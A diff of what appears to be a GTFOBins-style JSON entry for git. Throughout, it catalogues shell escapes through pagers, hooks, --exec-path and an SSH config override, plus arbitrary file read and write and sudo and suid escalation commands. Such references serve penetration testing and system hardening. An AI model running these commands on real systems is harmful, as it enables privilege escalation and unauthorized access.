@@ -2,64 +2,136 @@
   "functions": {
     "shell": [
       {
-        
-        "code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help\n"
+        "code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help"
       },
       {
-        "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
-        "code": "git help config\n!/bin/sh\n"
+        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
+        "code": "git help config\n!/bin/sh"
       },
       {
-        "description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
-        "code": "git branch --help config\n!/bin/sh\n"
+        "description": "The help system can also be reached from any git command, e.g., git branch.",
+        "code": "git branch --help config\n!/bin/sh"
       },
       {
-        "description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.",
-        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n"
+        "description": "Git hooks are merely shell scripts.",
+        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x"
       },
       {
-        
-        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x\n"
+        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x"
+      },
+
+      {
+        "code": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      },
+      {
+        "code": "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x",
+        "comment": "Git hooks are merely shell scripts and can be abused for shell execution.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      },
+      {
+        "code": "ln -s /bin/sh git-x\ngit --exec-path=. x",
+        "contexts": {
+          "sudo": null,
+          "suid": {
+            "code": "ln -s /bin/sh git-x\ngit --exec-path=. x -p",
+            "shell": false
+          },
+          "unprivileged": null
+        }
+      },
+      {
+        "code": "echo 'Match exec \"/bin/sh 0<&2 1>&2\"' > \"$HOME/.ssh/config\"; GIT_SSH_COMMAND=\"ssh -F ~/.ssh/config\" git clone user@host:repo.git",
+        "comment": "Spawns a shell on the client via SSH command override.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
       }
     ],
+
     "file-read": [
       {
-        "description": "The read file content is displayed in `diff` style output format.",
-        "code": "LFILE=file_to_read\ngit diff /dev/null $LFILE\n"
+        "description": "The read file content is displayed in diff style output format.",
+        "code": "LFILE=file_to_read\ngit diff /dev/null $LFILE"
+      },
+      {
+        "code": "git diff /dev/null /path/to/input-file",
+        "comment": "The read file content is displayed in diff style output format.",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       }
     ],
+
     "file-write": [
       {
-        "description": "The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.",
-        "code": "git apply --unsafe-paths --directory / x.patch\n"
+        "description": "Write files via patch.",
+        "code": "git apply --unsafe-paths --directory / x.patch"
+      },
+      {
+        "code": "git apply --unsafe-paths --directory / x.patch",
+        "comment": "Create patch locally:\necho DATA >/path/to/input-file\ngit diff /dev/null /path/to/input-file >x.patch",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       }
     ],
+
     "sudo": [
       {
-        
-        "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help\n"
+        "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
       },
       {
-        "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
-        "code": "sudo git -p help config\n!/bin/sh\n"
+        "description": "Pager escape via sudo.",
+        "code": "sudo git -p help config\n!/bin/sh"
       },
       {
-        "description": "The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
-        "code": "sudo git branch --help config\n!/bin/sh\n"
+        "description": "Pager escape via git branch.",
+        "code": "sudo git branch --help config\n!/bin/sh"
       },
       {
-        "description": "Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.",
-        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n"
+        "description": "Git hook execution via sudo.",
+        "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x"
       },
       {
-        
-        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
+        "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x"
       }
     ],
+
     "limited-suid": [
       {
-        
-        "code": "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help\n"
+        "code": "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
+      }
+    ],
+
+    "inherit": [
+      {
+        "code": "git help config",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        },
+        "from": "less"
+      },
+      {
+        "code": "git branch --help config\n!/bin/sh",
+        "comment": "Alternative help entry point.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        },
+        "from": "less"
       }
     ]
   }
